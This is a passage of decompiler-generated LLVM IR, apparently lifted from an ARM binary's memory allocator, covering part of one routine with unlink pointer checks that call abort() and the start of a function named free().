  %v3_135a8 = load i32, i32* %v2_135a8, align 4
  store i32 %v3_135a8, i32* %r8.global-to-local, align 4
  br i1 %v2_135a0, label %dec_label_pc_135b0, label %dec_label_pc_135e4

dec_label_pc_135b0:                               ; preds = %dec_label_pc_13594
  %v1_135b0 = inttoptr i32 %v0_135b0 to i32*
  %v2_135b0 = load i32, i32* %v1_135b0, align 4
  store i32 %v2_135b0, i32* %r5.global-to-local, align 4
  %v2_135b4 = sub i32 %v0_135b0, %v2_135b0
  store i32 %v2_135b4, i32* %r3.global-to-local, align 4
  %v1_135b8 = add i32 %v2_135b4, 8
  %v2_135b8 = inttoptr i32 %v1_135b8 to i32*
  %v3_135b8 = load i32, i32* %v2_135b8, align 4
  store i32 %v3_135b8, i32* %ip.global-to-local, align 4
  %v1_135bc = add i32 %v3_135b8, 12
  %v2_135bc = inttoptr i32 %v1_135bc to i32*
  %v3_135bc = load i32, i32* %v2_135bc, align 4
  store i32 %v3_135bc, i32* %r1.global-to-local, align 4
  %v9_135c0 = icmp eq i32 %v3_135bc, %v2_135b4
  %v1_135c4 = add i32 %v2_135b4, 12
  %v2_135c4 = inttoptr i32 %v1_135c4 to i32*
  %v3_135c4 = load i32, i32* %v2_135c4, align 4
  store i32 %v3_135c4, i32* %r2.global-to-local, align 4
  br i1 %v9_135c0, label %dec_label_pc_135cc, label %dec_label_pc_13628

dec_label_pc_135cc:                               ; preds = %dec_label_pc_135b0
  %v1_135cc = add i32 %v3_135c4, 8
  %v2_135cc = inttoptr i32 %v1_135cc to i32*
  %v3_135cc = load i32, i32* %v2_135cc, align 4
  store i32 %v3_135cc, i32* %r3.global-to-local, align 4
  %v9_135d0 = icmp eq i32 %v3_135cc, %v2_135b4
  br i1 %v9_135d0, label %dec_label_pc_135d8, label %dec_label_pc_13628

dec_label_pc_135d8:                               ; preds = %dec_label_pc_135cc
  store i32 %v3_135b8, i32* %v2_135cc, align 4
  %v0_135dc = load i32, i32* %r2.global-to-local, align 4
  %v1_135dc = load i32, i32* %ip.global-to-local, align 4
  %v2_135dc = add i32 %v1_135dc, 12
  %v3_135dc = inttoptr i32 %v2_135dc to i32*
  store i32 %v0_135dc, i32* %v3_135dc, align 4
  %v0_135e0 = load i32, i32* %lr.global-to-local, align 4
  %v1_135e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_135e0 = add i32 %v1_135e0, %v0_135e0
  store i32 %v2_135e0, i32* %lr.global-to-local, align 4
  %v0_135e8.pre = load i32, i32* @r0, align 4
  %v0_135ec.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_135e4

dec_label_pc_135e4:                               ; preds = %dec_label_pc_13594, %dec_label_pc_135d8
  %v0_1365c = phi i32 [ %v1_13598, %dec_label_pc_13594 ], [ %v2_135e0, %dec_label_pc_135d8 ]
  %v0_135ec = phi i32 [ %v3_135a8, %dec_label_pc_13594 ], [ %v0_135ec.pre, %dec_label_pc_135d8 ]
  %v1_13600 = phi i32 [ %v2_1359c, %dec_label_pc_13594 ], [ %v0_135e8.pre, %dec_label_pc_135d8 ]
  %v0_135e4 = load i32, i32* @r4, align 4
  %v1_135e4 = add i32 %v0_135e4, 44
  %v2_135e4 = inttoptr i32 %v1_135e4 to i32*
  %v3_135e4 = load i32, i32* %v2_135e4, align 4
  store i32 %v3_135e4, i32* %r3.global-to-local, align 4
  %v9_135e8 = icmp eq i32 %v1_13600, %v3_135e4
  %v1_135ec = and i32 %v0_135ec, -4
  store i32 %v1_135ec, i32* %r5.global-to-local, align 4
  br i1 %v9_135e8, label %dec_label_pc_1365c, label %dec_label_pc_135f4

dec_label_pc_135f4:                               ; preds = %dec_label_pc_135e4
  %v2_135f4 = add i32 %v1_13600, %v1_135ec
  store i32 %v2_135f4, i32* %r3.global-to-local, align 4
  %v1_135f8 = add i32 %v2_135f4, 4
  %v2_135f8 = inttoptr i32 %v1_135f8 to i32*
  %v3_135f8 = load i32, i32* %v2_135f8, align 4
  store i32 %v3_135f8, i32* %r3.global-to-local, align 4
  %v1_135fc = urem i32 %v3_135f8, 2
  %v2_135fc = icmp eq i32 %v1_135fc, 0
  %v2_13600 = add i32 %v1_13600, 4
  %v3_13600 = inttoptr i32 %v2_13600 to i32*
  store i32 %v1_135ec, i32* %v3_13600, align 4
  br i1 %v2_135fc, label %dec_label_pc_13608, label %dec_label_pc_135f4.dec_label_pc_13638_crit_edge

dec_label_pc_135f4.dec_label_pc_13638_crit_edge:  ; preds = %dec_label_pc_135f4
  %v0_1363c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13638

dec_label_pc_13608:                               ; preds = %dec_label_pc_135f4
  %v0_13608 = load i32, i32* @r0, align 4
  %v1_13608 = add i32 %v0_13608, 8
  %v2_13608 = inttoptr i32 %v1_13608 to i32*
  %v3_13608 = load i32, i32* %v2_13608, align 4
  store i32 %v3_13608, i32* %ip.global-to-local, align 4
  %v1_1360c = add i32 %v3_13608, 12
  %v2_1360c = inttoptr i32 %v1_1360c to i32*
  %v3_1360c = load i32, i32* %v2_1360c, align 4
  store i32 %v3_1360c, i32* %r3.global-to-local, align 4
  %v9_13610 = icmp eq i32 %v3_1360c, %v0_13608
  %v1_13614 = add i32 %v0_13608, 12
  %v2_13614 = inttoptr i32 %v1_13614 to i32*
  %v3_13614 = load i32, i32* %v2_13614, align 4
  store i32 %v3_13614, i32* %r2.global-to-local, align 4
  br i1 %v9_13610, label %dec_label_pc_1361c, label %dec_label_pc_13628

dec_label_pc_1361c:                               ; preds = %dec_label_pc_13608
  %v1_1361c = add i32 %v3_13614, 8
  %v2_1361c = inttoptr i32 %v1_1361c to i32*
  %v3_1361c = load i32, i32* %v2_1361c, align 4
  store i32 %v3_1361c, i32* %r3.global-to-local, align 4
  %v9_13620 = icmp eq i32 %v3_1361c, %v0_13608
  br i1 %v9_13620, label %dec_label_pc_1362c, label %dec_label_pc_13628

dec_label_pc_13628:                               ; preds = %dec_label_pc_13608, %dec_label_pc_135cc, %dec_label_pc_135b0, %dec_label_pc_1361c
  %v0_13628 = call i32 @abort()
  store i32 %v0_13628, i32* @r0, align 4
  %v0_1362c.pre = load i32, i32* @ip, align 4
  %v1_1362c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1362c

dec_label_pc_1362c:                               ; preds = %dec_label_pc_1361c, %dec_label_pc_13628
  %v1_1362c = phi i32 [ %v3_13614, %dec_label_pc_1361c ], [ %v1_1362c.pre, %dec_label_pc_13628 ]
  %v0_1362c = phi i32 [ %v3_13608, %dec_label_pc_1361c ], [ %v0_1362c.pre, %dec_label_pc_13628 ]
  %v2_1362c = add i32 %v1_1362c, 8
  %v3_1362c = inttoptr i32 %v2_1362c to i32*
  store i32 %v0_1362c, i32* %v3_1362c, align 4
  %v0_13630 = load i32, i32* %r2.global-to-local, align 4
  %v1_13630 = load i32, i32* %ip.global-to-local, align 4
  %v2_13630 = add i32 %v1_13630, 12
  %v3_13630 = inttoptr i32 %v2_13630 to i32*
  store i32 %v0_13630, i32* %v3_13630, align 4
  %v0_13634 = load i32, i32* %lr.global-to-local, align 4
  %v1_13634 = load i32, i32* %r5.global-to-local, align 4
  %v2_13634 = add i32 %v1_13634, %v0_13634
  store i32 %v2_13634, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13638

dec_label_pc_13638:                               ; preds = %dec_label_pc_135f4.dec_label_pc_13638_crit_edge, %dec_label_pc_1362c
  %v0_1363c = phi i32 [ %v0_1363c.pre, %dec_label_pc_135f4.dec_label_pc_13638_crit_edge ], [ %v2_13634, %dec_label_pc_1362c ]
  %v0_13638 = load i32, i32* %r7.global-to-local, align 4
  %v1_13638 = add i32 %v0_13638, 8
  %v2_13638 = inttoptr i32 %v1_13638 to i32*
  %v3_13638 = load i32, i32* %v2_13638, align 4
  store i32 %v3_13638, i32* %r2.global-to-local, align 4
  %v1_1363c = or i32 %v0_1363c, 1
  store i32 %v1_1363c, i32* %r3.global-to-local, align 4
  %v0_13640 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13640, i32* %v2_13638, align 4
  %v0_13644 = load i32, i32* %r1.global-to-local, align 4
  %v1_13644 = load i32, i32* %r2.global-to-local, align 4
  %v2_13644 = add i32 %v1_13644, 12
  %v3_13644 = inttoptr i32 %v2_13644 to i32*
  store i32 %v0_13644, i32* %v3_13644, align 4
  %v0_13648 = load i32, i32* %lr.global-to-local, align 4
  %v1_13648 = load i32, i32* %r1.global-to-local, align 4
  %v3_13648 = add i32 %v1_13648, %v0_13648
  %v4_13648 = inttoptr i32 %v3_13648 to i32*
  store i32 %v0_13648, i32* %v4_13648, align 4
  %v0_1364c = load i32, i32* %r3.global-to-local, align 4
  %v1_1364c = load i32, i32* %r1.global-to-local, align 4
  %v2_1364c = add i32 %v1_1364c, 4
  %v3_1364c = inttoptr i32 %v2_1364c to i32*
  store i32 %v0_1364c, i32* %v3_1364c, align 4
  %v0_13650 = load i32, i32* %r2.global-to-local, align 4
  %v1_13650 = load i32, i32* %r1.global-to-local, align 4
  %v2_13650 = add i32 %v1_13650, 8
  %v3_13650 = inttoptr i32 %v2_13650 to i32*
  store i32 %v0_13650, i32* %v3_13650, align 4
  %v0_13654 = load i32, i32* %r7.global-to-local, align 4
  %v1_13654 = load i32, i32* %r1.global-to-local, align 4
  %v2_13654 = add i32 %v1_13654, 12
  %v3_13654 = inttoptr i32 %v2_13654 to i32*
  store i32 %v0_13654, i32* %v3_13654, align 4
  br label %dec_label_pc_1366c

dec_label_pc_1365c:                               ; preds = %dec_label_pc_135e4
  %v2_1365c = add i32 %v1_135ec, %v0_1365c
  %v1_13660 = or i32 %v2_1365c, 1
  store i32 %v1_13660, i32* %r3.global-to-local, align 4
  %v1_13664 = load i32, i32* %r1.global-to-local, align 4
  %v2_13664 = add i32 %v1_13664, 4
  %v3_13664 = inttoptr i32 %v2_13664 to i32*
  store i32 %v1_13660, i32* %v3_13664, align 4
  %v0_13668 = load i32, i32* %r1.global-to-local, align 4
  %v1_13668 = load i32, i32* @r4, align 4
  %v2_13668 = add i32 %v1_13668, 44
  %v3_13668 = inttoptr i32 %v2_13668 to i32*
  store i32 %v0_13668, i32* %v3_13668, align 4
  br label %dec_label_pc_1366c

dec_label_pc_1366c:                               ; preds = %dec_label_pc_13638, %dec_label_pc_1365c
  %v0_1366c = load i32, i32* %sl.global-to-local, align 4
  %v2_1366c = icmp eq i32 %v0_1366c, 0
  store i32 %v0_1366c, i32* %r1.global-to-local, align 4
  br i1 %v2_1366c, label %dec_label_pc_13678.loopexit, label %dec_label_pc_13594

dec_label_pc_13678.loopexit:                      ; preds = %dec_label_pc_1366c
  %v0_13678.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_13678.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13678

dec_label_pc_13678:                               ; preds = %dec_label_pc_13678.loopexit, %dec_label_pc_13584
  %v1_13678 = phi i32 [ %v1_13678.pre, %dec_label_pc_13678.loopexit ], [ %v1_1367810, %dec_label_pc_13584 ]
  %v0_13680 = phi i32 [ %v0_13678.pre, %dec_label_pc_13678.loopexit ], [ %v1_13590, %dec_label_pc_13584 ]
  %v9_13678 = icmp eq i32 %v0_13680, %v1_13678
  br i1 %v9_13678, label %dec_label_pc_136f0, label %dec_label_pc_13680

dec_label_pc_13680:                               ; preds = %dec_label_pc_13678
  %v1_13680 = add i32 %v0_13680, 4
  store i32 %v1_13680, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13584

dec_label_pc_13688.dec_label_pc_13688_crit_edge:  ; preds = %dec_label_pc_13688.preheader, %dec_label_pc_13688.dec_label_pc_13688_crit_edge
  %v0_13688.pre = load i32, i32* @r4, align 4
  %v1_13688.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_13688 = mul i32 %v1_13688.pre, 8
  %v5_13688 = add i32 %v4_13688, %v0_13688.pre
  %v1_1368c = add i32 %v1_13688.pre, 1
  store i32 %v1_1368c, i32* %r2.global-to-local, align 4
  %v1_13690 = add i32 %v5_13688, 44
  store i32 %v1_13690, i32* %r3.global-to-local, align 4
  %v2_13698 = add i32 %v5_13688, 52
  %v3_13698 = inttoptr i32 %v2_13698 to i32*
  store i32 %v1_13690, i32* %v3_13698, align 4
  %v0_1369c = load i32, i32* %r3.global-to-local, align 4
  %v2_1369c = add i32 %v0_1369c, 12
  %v3_1369c = inttoptr i32 %v2_1369c to i32*
  store i32 %v0_1369c, i32* %v3_1369c, align 4
  %v7_136a0 = icmp sgt i32 %v1_1368c, 95
  br i1 %v7_136a0, label %dec_label_pc_136a4, label %dec_label_pc_13688.dec_label_pc_13688_crit_edge

dec_label_pc_136a4:                               ; preds = %dec_label_pc_13688.dec_label_pc_13688_crit_edge
  %v0_136a4 = load i32, i32* @r4, align 4
  %v1_136a4 = inttoptr i32 %v0_136a4 to i32*
  %v2_136a4 = load i32, i32* %v1_136a4, align 4
  store i32 %v2_136a4, i32* %r2.global-to-local, align 4
  %v1_136a8 = add i32 %v0_136a4, 864
  %v2_136a8 = inttoptr i32 %v1_136a8 to i32*
  %v3_136a8 = load i32, i32* %v2_136a8, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_136b0 = urem i32 %v2_136a4, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_136b8 = or i32 %v3_136a8, 1
  store i32 %v1_136b8, i32* %r1.global-to-local, align 4
  %v1_136bc = or i32 %v1_136b0, 72
  store i32 %v1_136bc, i32* %r2.global-to-local, align 4
  %v1_136c0 = add i32 %v0_136a4, 52
  store i32 %v1_136c0, i32* %ip.global-to-local, align 4
  %v2_136c4 = add i32 %v0_136a4, 840
  %v3_136c4 = inttoptr i32 %v2_136c4 to i32*
  store i32 0, i32* %v3_136c4, align 4
  %v0_136c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_136c8 = add i32 %v0_136c8, 65536
  store i32 %v1_136c8, i32* %r3.global-to-local, align 4
  %v0_136cc = load i32, i32* %r0.global-to-local, align 4
  %v1_136cc = load i32, i32* @r4, align 4
  %v2_136cc = add i32 %v1_136cc, 836
  %v3_136cc = inttoptr i32 %v2_136cc to i32*
  store i32 %v0_136cc, i32* %v3_136cc, align 4
  %v0_136d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_136d0 = load i32, i32* @r4, align 4
  %v2_136d0 = add i32 %v1_136d0, 844
  %v3_136d0 = inttoptr i32 %v2_136d0 to i32*
  store i32 %v0_136d0, i32* %v3_136d0, align 4
  %v1_136d4 = load i32, i32* @r4, align 4
  %v2_136d4 = add i32 %v1_136d4, 852
  %v3_136d4 = inttoptr i32 %v2_136d4 to i32*
  store i32 %v1_136c8, i32* %v3_136d4, align 4
  %v1_136d8 = load i32, i32* @r4, align 4
  %v2_136d8 = add i32 %v1_136d8, 864
  %v3_136d8 = inttoptr i32 %v2_136d8 to i32*
  store i32 %v1_136b8, i32* %v3_136d8, align 4
  %v1_136dc = load i32, i32* @r4, align 4
  %v2_136dc = inttoptr i32 %v1_136dc to i32*
  store i32 %v1_136bc, i32* %v2_136dc, align 4
  %v0_136e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_136e0 = load i32, i32* @r4, align 4
  %v2_136e0 = add i32 %v1_136e0, 44
  %v3_136e0 = inttoptr i32 %v2_136e0 to i32*
  store i32 %v0_136e0, i32* %v3_136e0, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_136e8 = call i32 @sysconf(i32 30, i32 %v1_136b8, i32 %v1_136bc, i32 %v1_136c8)
  store i32 %v4_136e8, i32* @r0, align 4
  %v1_136ec = load i32, i32* @r4, align 4
  %v2_136ec = add i32 %v1_136ec, 860
  %v3_136ec = inttoptr i32 %v2_136ec to i32*
  store i32 %v4_136e8, i32* %v3_136ec, align 4
  br label %dec_label_pc_136f0

dec_label_pc_136f0:                               ; preds = %dec_label_pc_13678, %dec_label_pc_136a4
  %v2_136f4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_136f4, i32* @r4, align 4
  %v1_136f8 = load i32, i32* @r0, align 4
  ret i32 %v1_136f8

; uselistorder directives
  uselistorder i32 %v0_136a4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1369c, { 1, 0 }
  uselistorder i32 %v1_13680, { 1, 0 }
  uselistorder i32 %v0_1366c, { 0, 2, 1 }
  uselistorder i32 %v0_13648, { 1, 0 }
  uselistorder i32 %v1_13598, { 1, 0, 2 }
  uselistorder i32 %v0_135b0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13570, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 2, 11, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 0, 5, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_136f0, { 1, 0 }
  uselistorder label %dec_label_pc_13688.dec_label_pc_13688_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1366c, { 1, 0 }
  uselistorder label %dec_label_pc_13638, { 1, 0 }
  uselistorder label %dec_label_pc_1362c, { 1, 0 }
  uselistorder label %dec_label_pc_13628, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_135e4, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_136fc = load i32, i32* @r4, align 4
  %v6_136fc = load i32, i32* @r5, align 4
  %v9_136fc = load i32, i32* @r6, align 4
  %v12_136fc = load i32, i32* @r7, align 4
  %v18_136fc = load i32, i32* @lr, align 4
  %v0_13704 = load i32, i32* @r0, align 4
  store i32 %v0_13704, i32* @r6, align 4
  %v2_13704 = icmp eq i32 %v0_13704, 0
  %v2_13708 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r7, align 4
  br i1 %v2_13704, label %dec_label_pc_13910, label %dec_label_pc_13714

dec_label_pc_13714:                               ; preds = %entry
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_13718 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 72) to i32*), align 4
  store i32 %v4_13718, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_13718, i32* %r2.global-to-local, align 4
  %v4_13724 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 36) to i32*), align 4
  store i32 %v4_13724, i32* %r1.global-to-local, align 4
  store i32 %v2_13708, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_13730 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  store i32 %v4_13730, i32* %ip.global-to-local, align 4
  store i32 79676, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13730)
  %v0_1373c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1373c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_13744 = load i32, i32* @r7, align 4
  %v2_13744 = add i32 %v0_13744, 16
  %v3_13744 = inttoptr i32 %v2_13744 to i32*
  %v4_13744 = load i32, i32* %v3_13744, align 4
  store i32 %v4_13744, i32* %ip.global-to-local, align 4
  store i32 79696, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13744)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_13754 = load i32, i32* @r7, align 4
  %v2_13754 = add i32 %v0_13754, 32
  %v3_13754 = inttoptr i32 %v2_13754 to i32*
  %v4_13754 = load i32, i32* %v3_13754, align 4
  store i32 %v4_13754, i32* @lr, align 4
  %v0_13758 = load i32, i32* @r6, align 4
  %v1_13758 = add i32 %v0_13758, -4
  %v2_13758 = inttoptr i32 %v1_13758 to i32*
  %v3_13758 = load i32, i32* %v2_13758, align 4
  store i32 %v3_13758, i32* %r2.global-to-local, align 4
  %v1_1375c = inttoptr i32 %v4_13754 to i32*
  %v2_1375c = load i32, i32* %v1_1375c, align 4
  store i32 %v2_1375c, i32* %r3.global-to-local, align 4
  %v1_13760 = and i32 %v3_13758, -4
  store i32 %v1_13760, i32* %ip.global-to-local, align 4
  %v1_13764 = add i32 %v0_13758, -8
  store i32 %v1_13764, i32* @r5, align 4
  store i32 %v1_13764, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_13760, %v2_1375c
  br i1 %tmp, label %dec_label_pc_13794, label %dec_label_pc_13774

dec_label_pc_13774:                               ; preds = %dec_label_pc_13714
  %v1_13774 = or i32 %v2_1375c, 3
  store i32 %v1_13774, i32* %r3.global-to-local, align 4
  store i32 %v1_13774, i32* %v1_1375c, align 4
  %v3_13778 = load i32, i32* @lr, align 4
  %v4_13778 = add i32 %v3_13778, -8
  store i32 %v4_13778, i32* %lr.global-to-local, align 4
  %v0_1377c = load i32, i32* %ip.global-to-local, align 4
  %v3_1377c = udiv i32 %v0_1377c, 8
  store i32 %v3_1377c, i32* %r1.global-to-local, align 4
  %v1_13780 = add i32 %v3_13778, -4
  store i32 %v1_13780, i32* %r2.global-to-local, align 4
  %v4_13784 = mul nuw i32 %v3_1377c, 4
  %v5_13784 = add i32 %v4_13784, %v1_13780
  %v6_13784 = inttoptr i32 %v5_13784 to i32*
  %v7_13784 = load i32, i32* %v6_13784, align 4
  store i32 %v7_13784, i32* %r3.global-to-local, align 4
  %v1_13788 = load i32, i32* @r5, align 4
  %v2_13788 = add i32 %v1_13788, 8
  %v3_13788 = inttoptr i32 %v2_13788 to i32*
  store i32 %v7_13784, i32* %v3_13788, align 4
  %v0_1378c = load i32, i32* @r5, align 4
  %v1_1378c = load i32, i32* %r2.global-to-local, align 4
  %v2_1378c = load i32, i32* %r1.global-to-local, align 4
  %v5_1378c = mul i32 %v2_1378c, 4
  %v6_1378c = add i32 %v5_1378c, %v1_1378c
  %v7_1378c = inttoptr i32 %v6_1378c to i32*
  store i32 %v0_1378c, i32* %v7_1378c, align 4
  br label %dec_label_pc_138f8

dec_label_pc_13794:                               ; preds = %dec_label_pc_13714
  %v1_13794 = and i32 %v3_13758, 2
  %v2_13794 = icmp eq i32 %v1_13794, 0
  br i1 %v2_13794, label %dec_label_pc_1379c, label %dec_label_pc_138d0

dec_label_pc_1379c:                               ; preds = %dec_label_pc_13794
  %v1_1379c = or i32 %v2_1375c, 1
  store i32 %v1_1379c, i32* %r3.global-to-local, align 4
  store i32 %v1_1379c, i32* %v1_1375c, align 4
  %v0_137a4 = load i32, i32* @r6, align 4
  %v1_137a4 = add i32 %v0_137a4, -4
  %v2_137a4 = inttoptr i32 %v1_137a4 to i32*
  %v3_137a4 = load i32, i32* %v2_137a4, align 4
  store i32 %v3_137a4, i32* %r3.global-to-local, align 4
  %v0_137a8 = load i32, i32* @r5, align 4
  %v1_137a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_137a8 = add i32 %v1_137a8, %v0_137a8
  store i32 %v2_137a8, i32* %lr.global-to-local, align 4
  %v1_137ac = urem i32 %v3_137a4, 2
  %v2_137ac = icmp eq i32 %v1_137ac, 0
  %v1_137b0 = add i32 %v2_137a8, 4
  %v2_137b0 = inttoptr i32 %v1_137b0 to i32*
  %v3_137b0 = load i32, i32* %v2_137b0, align 4
  store i32 %v3_137b0, i32* %r8.global-to-local, align 4
  br i1 %v2_137ac, label %dec_label_pc_137b8, label %dec_label_pc_137ec

dec_label_pc_137b8:                               ; preds = %dec_label_pc_1379c
  %v1_137b8 = add i32 %v0_137a4, -8
  %v2_137b8 = inttoptr i32 %v1_137b8 to i32*
  %v3_137b8 = load i32, i32* %v2_137b8, align 4
  store i32 %v3_137b8, i32* %r1.global-to-local, align 4
  %v2_137bc = sub i32 %v0_137a8, %v3_137b8
  store i32 %v2_137bc, i32* %r3.global-to-local, align 4
  %v1_137c0 = add i32 %v2_137bc, 8
  %v2_137c0 = inttoptr i32 %v1_137c0 to i32*
  %v3_137c0 = load i32, i32* %v2_137c0, align 4
  store i32 %v3_137c0, i32* %r2.global-to-local, align 4
  %v1_137c4 = add i32 %v3_137c0, 12
  %v2_137c4 = inttoptr i32 %v1_137c4 to i32*
  %v3_137c4 = load i32, i32* %v2_137c4, align 4
  store i32 %v3_137c4, i32* %r4.global-to-local, align 4
  %v9_137c8 = icmp eq i32 %v3_137c4, %v2_137bc
  %v1_137cc = add i32 %v2_137bc, 12
  %v2_137cc = inttoptr i32 %v1_137cc to i32*
  %v3_137cc = load i32, i32* %v2_137cc, align 4
  store i32 %v3_137cc, i32* %r0.global-to-local, align 4
  br i1 %v9_137c8, label %dec_label_pc_137d4, label %dec_label_pc_13838

dec_label_pc_137d4:                               ; preds = %dec_label_pc_137b8
  %v1_137d4 = add i32 %v3_137cc, 8
  %v2_137d4 = inttoptr i32 %v1_137d4 to i32*
  %v3_137d4 = load i32, i32* %v2_137d4, align 4
  store i32 %v3_137d4, i32* %r3.global-to-local, align 4
  %v9_137d8 = icmp eq i32 %v3_137d4, %v2_137bc
  br i1 %v9_137d8, label %dec_label_pc_137e0, label %dec_label_pc_13838

dec_label_pc_137e0:                               ; preds = %dec_label_pc_137d4
  store i32 %v3_137c0, i32* %v2_137d4, align 4
  %v0_137e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_137e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_137e4 = add i32 %v1_137e4, 12
  %v3_137e4 = inttoptr i32 %v2_137e4 to i32*
  store i32 %v0_137e4, i32* %v3_137e4, align 4
  %v0_137e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_137e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_137e8 = add i32 %v1_137e8, %v0_137e8
  store i32 %v2_137e8, i32* %ip.global-to-local, align 4
  %v0_137f8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_137fc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_137ec

dec_label_pc_137ec:                               ; preds = %dec_label_pc_1379c, %dec_label_pc_137e0
  %v0_13878 = phi i32 [ %v1_137a8, %dec_label_pc_1379c ], [ %v2_137e8, %dec_label_pc_137e0 ]
  %v0_137fc = phi i32 [ %v3_137b0, %dec_label_pc_1379c ], [ %v0_137fc.pre, %dec_label_pc_137e0 ]
  %v1_13810 = phi i32 [ %v2_137a8, %dec_label_pc_1379c ], [ %v0_137f8.pre, %dec_label_pc_137e0 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_137f0 = load i32, i32* @r7, align 4
  %v2_137f0 = add i32 %v0_137f0, 32
  %v3_137f0 = inttoptr i32 %v2_137f0 to i32*
  %v4_137f0 = load i32, i32* %v3_137f0, align 4
  store i32 %v4_137f0, i32* %r2.global-to-local, align 4
  %v1_137f4 = add i32 %v4_137f0, 44
  %v2_137f4 = inttoptr i32 %v1_137f4 to i32*
  %v3_137f4 = load i32, i32* %v2_137f4, align 4
  store i32 %v3_137f4, i32* %r3.global-to-local, align 4
  %v9_137f8 = icmp eq i32 %v1_13810, %v3_137f4
  %v1_137fc = and i32 %v0_137fc, -4
  store i32 %v1_137fc, i32* %r0.global-to-local, align 4
  br i1 %v9_137f8, label %dec_label_pc_13878, label %dec_label_pc_13804

dec_label_pc_13804:                               ; preds = %dec_label_pc_137ec
  %v2_13804 = add i32 %v1_13810, %v1_137fc
  store i32 %v2_13804, i32* %r3.global-to-local, align 4
  %v1_13808 = add i32 %v2_13804, 4
  %v2_13808 = inttoptr i32 %v1_13808 to i32*
  %v3_13808 = load i32, i32* %v2_13808, align 4
  store i32 %v3_13808, i32* %r3.global-to-local, align 4
  %v1_1380c = urem i32 %v3_13808, 2
  %v2_1380c = icmp eq i32 %v1_1380c, 0
  %v2_13810 = add i32 %v1_13810, 4
  %v3_13810 = inttoptr i32 %v2_13810 to i32*
  store i32 %v1_137fc, i32* %v3_13810, align 4
  br i1 %v2_1380c, label %dec_label_pc_13818, label %dec_label_pc_13804.dec_label_pc_13848_crit_edge

dec_label_pc_13804.dec_label_pc_13848_crit_edge:  ; preds = %dec_label_pc_13804
  %v0_13858.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13848

dec_label_pc_13818:                               ; preds = %dec_label_pc_13804
  %v0_13818 = load i32, i32* %lr.global-to-local, align 4
  %v1_13818 = add i32 %v0_13818, 8
  %v2_13818 = inttoptr i32 %v1_13818 to i32*
  %v3_13818 = load i32, i32* %v2_13818, align 4
  store i32 %v3_13818, i32* %r1.global-to-local, align 4
  %v1_1381c = add i32 %v3_13818, 12
  %v2_1381c = inttoptr i32 %v1_1381c to i32*
  %v3_1381c = load i32, i32* %v2_1381c, align 4
  store i32 %v3_1381c, i32* %r3.global-to-local, align 4
  %v9_13820 = icmp eq i32 %v3_1381c, %v0_13818
  %v1_13824 = add i32 %v0_13818, 12
  %v2_13824 = inttoptr i32 %v1_13824 to i32*
  %v3_13824 = load i32, i32* %v2_13824, align 4
  store i32 %v3_13824, i32* %r2.global-to-local, align 4
